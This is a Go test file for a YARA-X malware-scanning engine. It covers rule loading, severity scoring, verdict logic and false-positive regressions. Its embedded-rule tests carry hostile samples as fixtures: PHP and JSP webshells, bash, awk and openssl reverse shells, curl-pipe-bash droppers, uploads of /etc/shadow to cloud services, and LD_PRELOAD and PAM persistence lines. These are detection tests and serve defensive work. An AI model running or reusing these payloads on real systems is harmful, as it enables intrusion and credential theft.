//go:build yara

package yara

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"aether/internal/config"
	"aether/internal/events"
	"aether/internal/report"
)

func TestYaraX_EmbeddedDemoRules(t *testing.T) {
	cfg := config.NewDefaultConfig()
	cfg.Scan.DemoRules = true
	engine := NewYaraXEngine(cfg, nil, false)
	defer engine.Close()

	if err := engine.LoadRules(nil); err != nil {
		t.Fatalf("LoadRules failed: %v", err)
	}

	cov := engine.Coverage()
	if !cov.CompiledIn {
		t.Fatalf("expected CompiledIn = true")
	}
	if !cov.DemoRulesOnly {
		t.Fatalf("expected DemoRulesOnly = true")
	}
	if cov.RulesLoaded < 2 {
		t.Fatalf("expected at least 2 demo rules loaded, got %d", cov.RulesLoaded)
	}

	scanner := engine.NewScanner()
	defer scanner.Destroy()

	// 1. Scan EICAR payload
	eicarPayload := []byte("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
	matches, err := scanner.Scan(ScanTarget{
		Path:      "/tmp/eicar.com",
		Filename:  "eicar.com",
		Extension: ".com",
		Data:      eicarPayload,
	})
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	if len(matches) == 0 {
		t.Fatalf("expected match for EICAR payload")
	}
	m := matches[0]
	if m.RuleName != "Aether_Demo_EICAR" {
		t.Errorf("expected rule Aether_Demo_EICAR, got %s", m.RuleName)
	}
	if m.Score != 85 {
		t.Errorf("expected score 85, got %d", m.Score)
	}
	if !m.IsStrong {
		t.Errorf("expected IsStrong=true for score 85")
	}
	if m.Confidence != "high" {
		t.Errorf("expected confidence=high, got %s", m.Confidence)
	}
	if len(m.MatchedStrings) == 0 || m.MatchedStrings[0] != "$eicar" {
		t.Errorf("expected matched pattern identifier $eicar, got %v", m.MatchedStrings)
	}

	// 2. Scan Marker payload
	markerPayload := []byte("prefix AETHER_DEMO_TEST_MARKER_STRING suffix")
	mMatches, err := scanner.Scan(ScanTarget{
		Path:     "/tmp/test.txt",
		Filename: "test.txt",
		Data:     markerPayload,
	})
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	if len(mMatches) == 0 {
		t.Fatalf("expected match for marker payload")
	}
	if mMatches[0].RuleName != "Aether_Demo_Marker" {
		t.Errorf("expected rule Aether_Demo_Marker, got %s", mMatches[0].RuleName)
	}
	if mMatches[0].Score != 30 {
		t.Errorf("expected score 30, got %d", mMatches[0].Score)
	}
	if mMatches[0].Severity != report.SeverityNotice {
		t.Errorf("expected severity NOTICE for score 30, got %s", mMatches[0].Severity)
	}
}

func TestYaraX_Score60CannotAlertAlone(t *testing.T) {
	tempDir := t.TempDir()
	_ = os.Chmod(tempDir, 0755)

	ruleContent := `rule Weak_Threat {
    meta:
        score = 60
    strings:
        $s = "weak_threat_payload"
    condition:
        $s
}`
	ruleFile := filepath.Join(tempDir, "weak.yar")
	_ = os.WriteFile(ruleFile, []byte(ruleContent), 0644)

	cfg := config.NewDefaultConfig()
	engine := NewYaraXEngine(cfg, nil, false)
	defer engine.Close()

	if err := engine.LoadRules([]string{ruleFile}); err != nil {
		t.Fatalf("LoadRules failed: %v", err)
	}

	scanner := engine.NewScanner()
	defer scanner.Destroy()

	matches, err := scanner.Scan(ScanTarget{
		Path: "/tmp/file.bin",
		Data: []byte("contains weak_threat_payload here"),
	})
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	if len(matches) != 1 {
		t.Fatalf("expected 1 match, got %d", len(matches))
	}
	if matches[0].Severity == report.SeverityAlert {
		t.Fatalf("score 60 must NOT be ALERT, got ALERT")
	}
	if matches[0].Severity != report.SeverityWarning {
		t.Errorf("expected WARNING for score 60, got %s", matches[0].Severity)
	}
	if matches[0].IsStrong {
		t.Errorf("expected IsStrong=false for score 60")
	}
}

func TestYaraX_ConfidenceMetaDoesNotBypassVerdictStrength(t *testing.T) {
	tempDir := t.TempDir()
	_ = os.Chmod(tempDir, 0755)

	ruleNoConf := `rule Alert_No_Confidence {
    meta:
        score = 90
    strings:
        $s = "trigger_alert_1"
    condition:
        $s
}`
	ruleWithConf := `rule Alert_High_Confidence {
    meta:
        score = 90
        confidence = "high"
    strings:
        $s = "trigger_alert_2"
    condition:
        $s
}`
	file1 := filepath.Join(tempDir, "noconf.yar")
	file2 := filepath.Join(tempDir, "withconf.yar")
	_ = os.WriteFile(file1, []byte(ruleNoConf), 0644)
	_ = os.WriteFile(file2, []byte(ruleWithConf), 0644)

	cfg := config.NewDefaultConfig()
	engine := NewYaraXEngine(cfg, nil, false)
	defer engine.Close()

	_ = engine.LoadRules([]string{file1, file2})
	scanner := engine.NewScanner()
	defer scanner.Destroy()

	// 1. Without confidence="high"
	m1, _ := scanner.Scan(ScanTarget{Data: []byte("trigger_alert_1")})
	if len(m1) != 1 || m1[0].Severity != report.SeverityAlert {
		t.Fatalf("expected ALERT match for m1")
	}
	f1 := report.NewFinding("yara", m1[0].Severity, "/tmp/f1", "alert", m1[0].RuleName)
	f1.Metadata["confidence"] = m1[0].Confidence
	v1, _ := events.ComputeVerdict([]report.Finding{f1}, 1, 0, 0, 0)
	if v1 != events.VerdictSuspicious {
		t.Errorf("ALERT without confidence=high must result in SUSPICIOUS, got %s", v1)
	}

	// 2. With confidence="high": rule-declared confidence decorates the
	// finding but does NOT substitute for evidence strength. Custom
	// (unregistered) rules default to contextual strength, so even an ALERT
	// with confidence=high must stay SUSPICIOUS at the scan level — this is
	// the closed confidence-verdict bypass, locked by
	// internal/events TestComputeVerdict (regression: contextual alert even
	// with ConfidenceHigh must yield SUSPICIOUS, not COMPROMISED).
	m2, _ := scanner.Scan(ScanTarget{Data: []byte("trigger_alert_2")})
	if len(m2) != 1 || m2[0].Severity != report.SeverityAlert {
		t.Fatalf("expected ALERT match for m2")
	}
	if m2[0].Confidence != "high" {
		t.Errorf("expected engine to propagate confidence=high meta, got %q", m2[0].Confidence)
	}
	f2 := report.NewFinding("yara", m2[0].Severity, "/tmp/f2", "alert", m2[0].RuleName)
	f2.Metadata["confidence"] = m2[0].Confidence
	v2, _ := events.ComputeVerdict([]report.Finding{f2}, 1, 0, 0, 0)
	if v2 != events.VerdictSuspicious {
		t.Errorf("contextual ALERT with confidence=high must stay SUSPICIOUS (closed bypass), got %s", v2)
	}
}

func TestYaraX_TwoFilesSameRuleNameNamespaces(t *testing.T) {
	tempDir := t.TempDir()
	_ = os.Chmod(tempDir, 0755)

	ruleContent1 := `rule Duplicate_Name {
    meta:
        score = 60
    strings:
        $a = "test_dup_1"
    condition:
        $a
}`
	ruleContent2 := `rule Duplicate_Name {
    meta:
        score = 70
    strings:
        $a = "test_dup_2"
    condition:
        $a
}`

	file1 := filepath.Join(tempDir, "first.yar")
	file2 := filepath.Join(tempDir, "second.yar")
	_ = os.WriteFile(file1, []byte(ruleContent1), 0644)
	_ = os.WriteFile(file2, []byte(ruleContent2), 0644)

	cfg := config.NewDefaultConfig()
	engine := NewYaraXEngine(cfg, nil, false)
	defer engine.Close()

	if err := engine.LoadRules([]string{file1, file2}); err != nil {
		t.Fatalf("LoadRules failed: %v", err)
	}

	cov := engine.Coverage()
	if cov.RulesLoaded != 2 {
		t.Fatalf("expected 2 rules loaded across namespaces, got %d", cov.RulesLoaded)
	}
	if cov.RulesFailed != 0 {
		t.Errorf("expected 0 failed rules, got %d", cov.RulesFailed)
	}
}

func TestYaraX_OneBrokenFileAmongGood(t *testing.T) {
	tempDir := t.TempDir()
	_ = os.Chmod(tempDir, 0755)

	goodRule := `rule Valid_Rule {
    strings:
        $v = "valid_content"
    condition:
        $v
}`
	brokenRule := `rule Broken_Rule {
    strings:
        $b = "broken"
    condition:
        syntax_error_here === ???
}`

	fileGood := filepath.Join(tempDir, "good.yar")
	fileBad := filepath.Join(tempDir, "bad.yar")
	_ = os.WriteFile(fileGood, []byte(goodRule), 0644)
	_ = os.WriteFile(fileBad, []byte(brokenRule), 0644)

	cfg := config.NewDefaultConfig()
	engine := NewYaraXEngine(cfg, nil, false)
	defer engine.Close()

	if err := engine.LoadRules([]string{fileGood, fileBad}); err != nil {
		t.Fatalf("LoadRules should not return fatal error when bad file is skipped: %v", err)
	}

	cov := engine.Coverage()
	if cov.RulesLoaded != 1 {
		t.Errorf("expected 1 valid rule loaded, got %d", cov.RulesLoaded)
	}
	if cov.RulesFailed != 1 {
		t.Errorf("expected 1 rule failed, got %d", cov.RulesFailed)
	}
	if len(cov.FailedFiles) != 1 || cov.FailedFiles[0] != fileBad {
		t.Errorf("expected failed file %s, got %v", fileBad, cov.FailedFiles)
	}
}

func TestYaraX_ExternalVariableFilename(t *testing.T) {
	tempDir := t.TempDir()
	_ = os.Chmod(tempDir, 0755)

	rule := `rule Filename_Check {
    strings:
        $payload = "trigger_payload"
    condition:
        $payload and filename == "special_exec.sh"
}`
	file := filepath.Join(tempDir, "ext_var.yar")
	_ = os.WriteFile(file, []byte(rule), 0644)

	cfg := config.NewDefaultConfig()
	engine := NewYaraXEngine(cfg, nil, false)
	defer engine.Close()

	if err := engine.LoadRules([]string{file}); err != nil {
		t.Fatalf("LoadRules failed: %v", err)
	}

	scanner := engine.NewScanner()
	defer scanner.Destroy()

	payload := []byte("trigger_payload inside file")

	// 1. Scan with matching filename
	matches1, err := scanner.Scan(ScanTarget{
		Path:     "/tmp/special_exec.sh",
		Filename: "special_exec.sh",
		Data:     payload,
	})
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	if len(matches1) != 1 {
		t.Errorf("expected match when filename == special_exec.sh, got %d", len(matches1))
	}

	// 2. Scan with non-matching filename
	matches2, err := scanner.Scan(ScanTarget{
		Path:     "/tmp/other.sh",
		Filename: "other.sh",
		Data:     payload,
	})
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	if len(matches2) != 0 {
		t.Errorf("expected 0 matches when filename != special_exec.sh, got %d", len(matches2))
	}
}

func TestYaraX_DisabledRulesAndTags(t *testing.T) {
	tempDir := t.TempDir()
	_ = os.Chmod(tempDir, 0755)

	rule := `rule Disabled_Target : noise apt {
    strings:
        $t = "test_pattern"
    condition:
        $t
}`
	file := filepath.Join(tempDir, "rule.yar")
	_ = os.WriteFile(file, []byte(rule), 0644)

	// 1. Test disabled rule by name
	cfg1 := config.NewDefaultConfig()
	cfg1.Scan.DisabledRules = []string{"Disabled_Target"}
	engine1 := NewYaraXEngine(cfg1, nil, false)
	_ = engine1.LoadRules([]string{file})
	scanner1 := engine1.NewScanner()
	matches1, _ := scanner1.Scan(ScanTarget{Data: []byte("test_pattern")})
	if len(matches1) != 0 {
		t.Errorf("expected 0 matches when rule is disabled by name, got %d", len(matches1))
	}
	scanner1.Destroy()
	engine1.Close()

	// 2. Test disabled rule by tag
	cfg2 := config.NewDefaultConfig()
	cfg2.Scan.DisabledTags = []string{"noise"}
	engine2 := NewYaraXEngine(cfg2, nil, false)
	_ = engine2.LoadRules([]string{file})
	scanner2 := engine2.NewScanner()
	matches2, _ := scanner2.Scan(ScanTarget{Data: []byte("test_pattern")})
	if len(matches2) != 0 {
		t.Errorf("expected 0 matches when rule is disabled by tag, got %d", len(matches2))
	}
	scanner2.Destroy()
	engine2.Close()
}

func TestYaraX_MetadataSeverityDefaultingAndMapping(t *testing.T) {
	tempDir := t.TempDir()
	_ = os.Chmod(tempDir, 0755)

	ruleNoMeta := `rule Default_Rule {
    strings:
        $d = "default_target"
    condition:
        $d
}`
	ruleSeverityAlert := `rule Sev_Alert_Rule {
    meta:
        severity = "alert"
    strings:
        $a = "alert_target"
    condition:
        $a
}`
	ruleSeverityNotice := `rule Sev_Notice_Rule {
    meta:
        severity = "notice"
    strings:
        $n = "notice_target"
    condition:
        $n
}`
	f1 := filepath.Join(tempDir, "default.yar")
	f2 := filepath.Join(tempDir, "alert.yar")
	f3 := filepath.Join(tempDir, "notice.yar")
	_ = os.WriteFile(f1, []byte(ruleNoMeta), 0644)
	_ = os.WriteFile(f2, []byte(ruleSeverityAlert), 0644)
	_ = os.WriteFile(f3, []byte(ruleSeverityNotice), 0644)

	cfg := config.NewDefaultConfig()
	engine := NewYaraXEngine(cfg, nil, false)
	defer engine.Close()

	if err := engine.LoadRules([]string{f1, f2, f3}); err != nil {
		t.Fatalf("LoadRules failed: %v", err)
	}

	scanner := engine.NewScanner()
	defer scanner.Destroy()

	// 1. Default (no meta) -> WARNING, score 50
	m1, err := scanner.Scan(ScanTarget{Data: []byte("default_target")})
	if err != nil || len(m1) != 1 {
		t.Fatalf("expected 1 match for default_target, got %d (err=%v)", len(m1), err)
	}
	if m1[0].Severity != report.SeverityWarning || m1[0].Score != 50 {
		t.Errorf("expected WARNING/score 50 for default meta, got %s/%d", m1[0].Severity, m1[0].Score)
	}

	// 2. severity = "alert" -> ALERT, score 90
	m2, err := scanner.Scan(ScanTarget{Data: []byte("alert_target")})
	if err != nil || len(m2) != 1 {
		t.Fatalf("expected 1 match for alert_target, got %d (err=%v)", len(m2), err)
	}
	if m2[0].Severity != report.SeverityAlert || m2[0].Score != 90 {
		t.Errorf("expected ALERT/score 90 for severity=alert, got %s/%d", m2[0].Severity, m2[0].Score)
	}

	// 3. severity = "notice" -> NOTICE, score 25
	m3, err := scanner.Scan(ScanTarget{Data: []byte("notice_target")})
	if err != nil || len(m3) != 1 {
		t.Fatalf("expected 1 match for notice_target, got %d (err=%v)", len(m3), err)
	}
	if m3[0].Severity != report.SeverityNotice || m3[0].Score != 25 {
		t.Errorf("expected NOTICE/score 25 for severity=notice, got %s/%d", m3[0].Severity, m3[0].Score)
	}
}

func TestYaraX_MatchedStringIdentifiers(t *testing.T) {
	tempDir := t.TempDir()
	_ = os.Chmod(tempDir, 0755)

	rule := `rule Multi_String {
    strings:
        $str1 = "secret_keyword_1"
        $str2 = "secret_keyword_2"
        $str3 = "absent_keyword"
    condition:
        $str1 or $str2 or $str3
}`
	f := filepath.Join(tempDir, "multi.yar")
	_ = os.WriteFile(f, []byte(rule), 0644)

	cfg := config.NewDefaultConfig()
	engine := NewYaraXEngine(cfg, nil, false)
	defer engine.Close()

	if err := engine.LoadRules([]string{f}); err != nil {
		t.Fatalf("LoadRules error: %v", err)
	}
	cov := engine.Coverage()
	t.Logf("Coverage: rulesLoaded=%d, rulesFailed=%d, failedFiles=%v, notRunReason=%s", cov.RulesLoaded, cov.RulesFailed, cov.FailedFiles, cov.NotRunReason)

	scanner := engine.NewScanner()
	defer scanner.Destroy()

	matches, err := scanner.Scan(ScanTarget{Data: []byte("here is secret_keyword_1 and secret_keyword_2")})
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	if len(matches) != 1 {
		t.Fatalf("expected 1 match, got %d (cov=%+v)", len(matches), cov)
	}

	m := matches[0]
	if len(m.MatchedStrings) != 2 {
		t.Fatalf("expected 2 matched strings, got %d: %v", len(m.MatchedStrings), m.MatchedStrings)
	}
	if m.MatchedStrings[0] != "$str1" || m.MatchedStrings[1] != "$str2" {
		t.Errorf("expected [$str1, $str2], got %v", m.MatchedStrings)
	}
}

func TestYaraX_ValidateRulesDir_Empty(t *testing.T) {
	tempDir := t.TempDir()
	res, err := ValidateRulesDir(tempDir)
	if err != nil {
		t.Fatalf("unexpected error validating empty dir: %v", err)
	}
	if res.TotalFilesFound != 0 || res.FilesCompiled != 0 || res.FilesFailed != 0 || res.TotalRulesLoaded != 0 {
		t.Errorf("expected all 0 stats for empty dir, got %+v", res)
	}
	if len(res.Failures) != 0 {
		t.Errorf("expected 0 failures, got %v", res.Failures)
	}
}

func TestYaraX_ValidateRulesDir_Valid(t *testing.T) {
	tempDir := t.TempDir()
	r1 := `rule Valid_One { strings: $a = "test1" condition: $a }`
	r2 := `rule Valid_Two { strings: $b = "test2" condition: $b }
rule Valid_Three { strings: $c = "test3" condition: $c }`

	_ = os.WriteFile(filepath.Join(tempDir, "r1.yar"), []byte(r1), 0644)
	_ = os.WriteFile(filepath.Join(tempDir, "r2.yara"), []byte(r2), 0644)

	res, err := ValidateRulesDir(tempDir)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if res.TotalFilesFound != 2 {
		t.Errorf("expected 2 files found, got %d", res.TotalFilesFound)
	}
	if res.FilesCompiled != 2 {
		t.Errorf("expected 2 files compiled, got %d", res.FilesCompiled)
	}
	if res.FilesFailed != 0 {
		t.Errorf("expected 0 files failed, got %d", res.FilesFailed)
	}
	if res.TotalRulesLoaded != 3 {
		t.Errorf("expected 3 total rules loaded, got %d", res.TotalRulesLoaded)
	}
}

func TestYaraX_ValidateRulesDir_Broken(t *testing.T) {
	tempDir := t.TempDir()
	goodRule := `rule Good { strings: $g = "good" condition: $g }`
	badRule := `rule Bad { strings: $b = "bad" condition: syntax_error ??? }`

	_ = os.WriteFile(filepath.Join(tempDir, "good.yar"), []byte(goodRule), 0644)
	_ = os.WriteFile(filepath.Join(tempDir, "bad.yar"), []byte(badRule), 0644)

	res, err := ValidateRulesDir(tempDir)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if res.TotalFilesFound != 2 {
		t.Errorf("expected 2 files found, got %d", res.TotalFilesFound)
	}
	if res.FilesCompiled != 1 {
		t.Errorf("expected 1 file compiled, got %d", res.FilesCompiled)
	}
	if res.FilesFailed != 1 {
		t.Errorf("expected 1 file failed, got %d", res.FilesFailed)
	}
	if len(res.Failures) != 1 {
		t.Fatalf("expected 1 failure entry, got %d", len(res.Failures))
	}
	if !strings.Contains(res.Failures[0].Path, "bad.yar") {
		t.Errorf("expected failure path to contain bad.yar, got %s", res.Failures[0].Path)
	}
	if res.Failures[0].Error == "" {
		t.Errorf("expected non-empty compiler error message")
	}
	if res.TotalRulesLoaded != 1 {
		t.Errorf("expected 1 rule loaded from good file, got %d", res.TotalRulesLoaded)
	}
}

func TestYaraX_ValidateRulesDir_NonExistent(t *testing.T) {
	_, err := ValidateRulesDir("/path/that/does/not/exist/at/all")
	if err == nil {
		t.Errorf("expected error for non-existent directory")
	}
}

func TestYaraX_EmbeddedCoreLinuxRules(t *testing.T) {
	cfg := config.NewDefaultConfig()
	engine := NewYaraXEngine(cfg, nil, false)
	defer engine.Close()

	if err := engine.LoadRules(nil); err != nil {
		t.Fatalf("LoadRules failed: %v", err)
	}

	cov := engine.Coverage()
	if !cov.CompiledIn {
		t.Fatalf("expected CompiledIn = true")
	}
	if cov.DemoRulesOnly {
		t.Fatalf("expected DemoRulesOnly = false for embedded core rules")
	}
	if cov.RulesLoaded < 8 {
		t.Fatalf("expected at least 8 embedded core rules, got %d", cov.RulesLoaded)
	}

	scanner := engine.NewScanner()
	defer scanner.Destroy()

	tests := []struct {
		ruleName string
		path     string
		filename string
		payload  []byte
	}{
		{
			ruleName: "Linux_Webshell_PHP_Generic_Backdoor",
			path:     "/var/www/html/shell.php",
			filename: "shell.php",
			payload:  []byte("<?php @eval(base64_decode($_POST['cmd'])); ?>"),
		},
		{
			ruleName: "Linux_Webshell_PHP_Known_Families",
			path:     "/var/www/c99.php",
			filename: "c99.php",
			payload:  []byte("<?php // c99shell v2.1 ?>"),
		},
		{
			ruleName: "Linux_Webshell_JSP_Runtime_Exec",
			path:     "/var/www/shell.jsp",
			filename: "shell.jsp",
			payload:  []byte("<% String cmd = request.getParameter(\"cmd\"); Runtime.getRuntime().exec(cmd); %>"),
		},
		{
			ruleName: "Linux_Backdoor_Reverse_Shell_OneLiner",
			path:     "/tmp/rev.sh",
			filename: "rev.sh",
			payload:  []byte("#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\n"),
		},
		{
			ruleName: "Linux_Backdoor_Encrypted_Reverse_Shell",
			path:     "/tmp/ssl_rev.sh",
			filename: "ssl_rev.sh",
			payload:  []byte("openssl s_client -quiet -connect 10.0.0.1:443 | /bin/bash\n"),
		},
		{
			ruleName: "Linux_Implant_RedTeam_Persistence_Framework",
			path:     "/tmp/persist.sh",
			filename: "persist.sh",
			payload:  []byte("#!/bin/bash\nmkfifo /tmp/.gs_pipe_1; /bin/bash < /tmp/.gs_pipe_1\n"),
		},
		{
			ruleName: "Linux_Rootkit_LDPRELOAD_Hook_Artifact",
			path:     "/tmp/hook.so",
			filename: "hook.so",
			payload:  append([]byte{0x7f, 'E', 'L', 'F', 0x02, 0x01, 0x01, 0x00}, []byte("/etc/ld.so.preload dlsym(RTLD_NEXT readdir")...),
		},
		{
			ruleName: "Linux_Rootkit_Diamorphine_Reptile_Strings",
			path:     "/tmp/diamorph.txt",
			filename: "diamorph.txt",
			payload:  []byte("diamorphine is_invisible hacked_kill"),
		},
		{
			ruleName: "Linux_Malware_Cryptominer_Stratum_Pool",
			path:     "/tmp/config.json",
			filename: "config.json",
			payload:  []byte("{\"algo\": \"randomx\", \"pools\": [{\"url\": \"stratum+tcp://pool.supportxmr.com:3333\"}]}"),
		},
		{
			ruleName: "Linux_Dropper_Remote_Pipe_Shell_Execution",
			path:     "/tmp/drop.sh",
			filename: "drop.sh",
			payload:  []byte("curl -s https://example.com/payload.sh | bash\n"),
		},
		{
			ruleName: "Linux_Ransomware_Python_Locker",
			path:     "/tmp/locker.py",
			filename: "locker.py",
			payload:  []byte("from cryptography.fernet import Fernet\nimport os\nfor r,d,f in os.walk('/'):\n    enc = f.encrypt(b'')\n    os.remove('f')\n"),
		},
		{
			ruleName: "Linux_Malware_Data_Exfiltration_Client",
			path:     "/tmp/exfil.py",
			filename: "exfil.py",
			payload:  []byte("import socket, os, zlib\ns = socket.socket()\nfor r,d,f in os.walk('/'):\n    c = zlib.compress(b'')\n    s.sendall(c)\n# exfil routine\n"),
		},
		{
			ruleName: "Linux_Malware_Data_Exfiltration_Server",
			path:     "/tmp/srv.py",
			filename: "srv.py",
			payload:  []byte("import socket, zlib\ns = socket.socket()\ns.bind(('0.0.0.0', 4444))\ns.listen(5)\nconn, _ = s.accept()\ndata = conn.recv(1024)\nstolen = zlib.decompress(data)\n"),
		},
		{
			ruleName: "Linux_Script_PowerShell_Encoded_Execution",
			path:     "/tmp/ps.sh",
			filename: "ps.sh",
			payload:  []byte("pwsh -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA=\n"),
		},
		{
			ruleName: "Linux_Script_Cloud_Exfiltration_Tool",
			path:     "/tmp/sync.sh",
			filename: "sync.sh",
			payload:  []byte("rclone sync /etc/shadow remote:backup/data.tar.gz\n"),
		},
		{
			ruleName: "Linux_Persistence_Linker_Audit_Hijack",
			path:     "/etc/profile.d/audit.sh",
			filename: "audit.sh",
			payload:  []byte("export LD_AUDIT=/opt/stealth/libaudit.so\n"),
		},
		{
			ruleName: "Linux_Persistence_PAM_Exec_Suspicious",
			path:     "/etc/pam.d/common-auth",
			filename: "common-auth",
			payload:  []byte("auth optional pam_exec.so /tmp/.session_logger.sh\n"),
		},
	}

	for _, tc := range tests {
		t.Run(tc.ruleName, func(t *testing.T) {
			matches, err := scanner.Scan(ScanTarget{
				Path:     tc.path,
				Filename: tc.filename,
				Data:     tc.payload,
			})
			if err != nil {
				t.Fatalf("scan error for %s: %v", tc.ruleName, err)
			}
			found := false
			for _, m := range matches {
				if m.RuleName == tc.ruleName {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("expected match for rule %s, got: %v", tc.ruleName, matches)
			}
		})
	}
}

func TestYaraX_EmbeddedCoreLinuxRules_BroadenedVariants(t *testing.T) {
	cfg := config.NewDefaultConfig()
	engine := NewYaraXEngine(cfg, nil, false)
	defer engine.Close()

	if err := engine.LoadRules(nil); err != nil {
		t.Fatalf("LoadRules failed: %v", err)
	}

	cov := engine.Coverage()
	if !cov.CompiledIn {
		t.Skip("YARA-X engine not compiled in")
	}

	scanner := engine.NewScanner()
	defer scanner.Destroy()

	variants := []struct {
		name     string
		ruleName string
		payload  []byte
	}{
		{
			name:     "PHP webshell variable indirection",
			ruleName: "Linux_Webshell_PHP_Generic_Backdoor",
			payload:  []byte("<?php $cmd = $_POST['c']; eval($cmd); ?>"),
		},
		{
			name:     "PHP webshell callback execution",
			ruleName: "Linux_Webshell_PHP_Generic_Backdoor",
			payload:  []byte("<?php call_user_func('system', $_GET['x']); ?>"),
		},
		{
			name:     "Awk reverse shell",
			ruleName: "Linux_Backdoor_Reverse_Shell_OneLiner",
			payload:  []byte("awk 'BEGIN {s = \"/inet/tcp/0/10.0.0.1/4444\"; while (42) { do{ printf \"shell>\" |& s; s |& getline c; } while (c != \"exit\") close(s); }}'"),
		},
		{
			name:     "Stealth procfs tmpfs mount",
			ruleName: "Linux_Implant_RedTeam_Persistence_Framework",
			payload:  []byte("mount -t tmpfs tmpfs /proc/$$"),
		},
		{
			name:     "s5cmd cloud exfil tool",
			ruleName: "Linux_Script_Cloud_Exfiltration_Tool",
			payload:  []byte("s5cmd cp /etc/shadow s3://threat-bucket/\n"),
		},
		{
			name:     "catbox curl exfil upload",
			ruleName: "Linux_Script_Cloud_Exfiltration_Tool",
			payload:  []byte("curl -F file=@/etc/shadow https://catbox.moe/api/upload.php\n"),
		},
		{
			name:     "systemd Environment LD_PRELOAD injection",
			ruleName: "Linux_Persistence_Linker_Audit_Hijack",
			payload:  []byte("[Service]\nEnvironment=\"LD_PRELOAD=/opt/libaudit.so\"\n"),
		},
		{
			name:     "ld.so.preload hostile write",
			ruleName: "Linux_Persistence_Linker_Audit_Hijack",
			payload:  []byte("#!/bin/sh\necho \"/tmp/ldhook.so\" > /etc/ld.so.preload\n"),
		},
		{
			name:     "PAM exec with seteuid elevated privileges",
			ruleName: "Linux_Persistence_PAM_Exec_Suspicious",
			payload:  []byte("auth required pam_exec.so seteuid /usr/local/bin/custom_authenticator\n"),
		},
	}

	for _, tc := range variants {
		t.Run(tc.name, func(t *testing.T) {
			matches, err := scanner.Scan(ScanTarget{
				Path:     "/tmp/test_variant",
				Filename: "test_variant",
				Data:     tc.payload,
			})
			if err != nil {
				t.Fatalf("scan error for %s: %v", tc.name, err)
			}
			found := false
			for _, m := range matches {
				if m.RuleName == tc.ruleName {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("expected match for rule %s, got: %v", tc.ruleName, matches)
			}
		})
	}
}

type mockYaraPkgDB struct {
	owners map[string]string
}

// TestYaraX_BenignContent_NoHighSeverityMatches locks in false-positive
// regressions: benign text that shares tokens with real threats (bare
// ld.so.preload references, router-style dynamic calls, form handlers) must
// never trigger the tightened high-severity rules.
func TestYaraX_BenignContent_NoHighSeverityMatches(t *testing.T) {
	cfg := config.NewDefaultConfig()
	engine := NewYaraXEngine(cfg, nil, false)
	defer engine.Close()

	if err := engine.LoadRules(nil); err != nil {
		t.Fatalf("LoadRules failed: %v", err)
	}

	cov := engine.Coverage()
	if !cov.CompiledIn {
		t.Skip("YARA-X engine not compiled in")
	}

	scanner := engine.NewScanner()
	defer scanner.Destroy()

	cases := []struct {
		name      string
		path      string
		payload   []byte
		forbidden []string
	}{
		{
			name:      "hardening checker referencing ld.so.preload",
			path:      "/usr/local/sbin/audit.sh",
			payload:   []byte("#!/bin/bash\n# verify no rogue entries in /etc/ld.so.preload\nif [ -s /etc/ld.so.preload ]; then cat /etc/ld.so.preload; fi\n"),
			forbidden: []string{"Linux_Persistence_Linker_Audit_Hijack"},
		},
		{
			name:      "documentation mentioning ld.so.preload",
			path:      "/usr/share/doc/hardening/notes.md",
			payload:   []byte("The dynamic linker reads /etc/ld.so.preload before the library cache.\n"),
			forbidden: []string{"Linux_Persistence_Linker_Audit_Hijack"},
		},
		{
			name:      "micro-framework dynamic router call",
			path:      "/var/www/html/index.php",
			payload:   []byte("<?php $handler = $_POST['route']; $args = $_POST['args']; $handler($args); ?>\n"),
			forbidden: []string{"Linux_Webshell_PHP_Generic_Backdoor"},
		},
		{
			name:      "standard form handler",
			path:      "/var/www/html/contact.php",
			payload:   []byte("<?php\n$name = $_POST['name'];\n$email = $_POST['email'];\nmail('admin@example.com', $name, $email);\necho htmlspecialchars($name);\n?>\n"),
			forbidden: []string{"Linux_Webshell_PHP_Generic_Backdoor"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			matches, err := scanner.Scan(ScanTarget{
				Path:     tc.path,
				Filename: filepath.Base(tc.path),
				Data:     tc.payload,
			})
			if err != nil {
				t.Fatalf("scan error for %s: %v", tc.name, err)
			}
			for _, m := range matches {
				for _, forbidden := range tc.forbidden {
					if m.RuleName == forbidden {
						t.Errorf("false positive: benign content %q triggered %s", tc.name, forbidden)
					}
				}
			}
		})
	}
}

func (m *mockYaraPkgDB) Owner(path string) (string, bool) {
	if m.owners == nil {
		return "", false
	}
	owner, ok := m.owners[path]
	return owner, ok
}

func (m *mockYaraPkgDB) VerifyDigest(path string, actualMD5 string) (bool, string, bool) {
	return true, "", false
}

func (m *mockYaraPkgDB) VerifyDigestSHA256(path string, actualSHA256 string) (bool, string, bool) {
	return true, "", false
}

func (m *mockYaraPkgDB) IsAvailable() bool  { return true }
func (m *mockYaraPkgDB) StatusNote() string { return "mock db" }

func TestYaraX_PackageOwnedAndDocContext_VerdictSafe(t *testing.T) {
	pkgDB := &mockYaraPkgDB{
		owners: map[string]string{
			"/usr/lib/python3/dist-packages/elasticsearch-9.5.0.dist-info/METADATA": "python3-elasticsearch",
			"/usr/lib/python3/dist-packages/twisted/test/test_fdset.py":             "python3-twisted",
		},
	}

	// 1. Doc metadata fixture with dropper pattern -> VerdictSafe / SeverityNotice
	fDoc := report.NewFinding("yara", report.SeverityWarning, "/usr/lib/python3/dist-packages/elasticsearch-9.5.0.dist-info/METADATA", "YARA match: Linux_Dropper_Remote_Pipe_Shell_Execution", "Linux_Dropper_Remote_Pipe_Shell_Execution")
